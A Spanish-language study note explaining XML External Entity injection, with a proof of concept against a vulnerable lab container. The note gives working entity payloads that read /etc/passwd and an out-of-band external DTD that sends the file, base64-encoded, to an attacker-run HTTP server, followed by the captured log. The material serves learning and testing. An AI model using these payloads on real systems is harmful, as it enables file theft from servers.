Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada [[XML]] maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red.

Un ataque XXE generalmente implica la inyección de una **entidad** [[XML]] maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos [[XML]] que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo [[SSRF]] (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

# PoC

Haremos la **Prueba de Concepto** utilizando el contenedor del siguiente [repo](https://github.com/jbarone/xxelab). Al acceder, vemos que hay un panel para registrarse, si interceptamos la petición con [[burpsuite]], podremos ver la siguiente estructura [[XML]]:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<name>hola</name>
	<tel>345345345</tel>
	<email>hola@hola.com</email>
	<password>hola</password>
</root>
```

Si lo mandamos al *repeater* y vemos la respuesta veremos la siguiente data:

```response
Sorry, hola@hola.com is already registered!
```

Vamos a intentar declarar una **entidad** y pasarla como valor de *email*:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe "miEntidad">]>
<root>
	[...]
	<email>&xxe;</email>
	[...]
</root>
```
```response
Sorry, miEntidad is already registered!
```

Como parece que podemos incorporar entidades a la respuesta, vamos a tratar de definir una entidad que haga referencia al */etc/passwd* para tratar de listarlo:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]>
```
```response
Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
 is already registered!
```

Hay otras formas de listarlo, pero eso es ya [[Local File Inclusion (LFI)]].

## XXE OOB

Significa **XXE Out Of Band Interaction**, y se dan cuando no podemos visualizar el output, de forma que vamos "a ciegas".

Si ahora creamos la siguiente entidad:

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://tu-ip/malicious.dtd">]>
```

Nos montamos un **servidor http** en [[python 1]] y  enviamos la petición:

```bash
python3 -m http.server 80
```
```response
172.17.0.2 - - [13/Jul/2023 12:55:19] code 404, message File not found
172.17.0.2 - - [13/Jul/2023 12:55:19] "GET /testXXE HTTP/1.0" 404 -
```

Si se diera el caso que no pudieramos llamar a la entidad desde el cuerpo, podemos evadirlo llamándola desde la propia declaración de la siguiente manera:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://tu-ip/malicious.dtd"> %xxe;]>
```

Si dentro del recurso, creamos el siguiente dtd, que nos envíe el contenido del */etc/passwd*:

```xml
<!ENTITY % file SYSTEM "php://filter/convert/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://172.17.0.1/?file=%file;'>">
%eval;
%exfil;
```

Si ahora nos volvemos a montar el servidor http y hacemos una petición desde burpsuite:

```http response
172.17.0.2 - - [13/Jul/2023 14:05:33] "GET /?file=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQo= HTTP/1.0" 200 -
```

Si lo decodificamos desde base64, veríamos el /etc/passwd.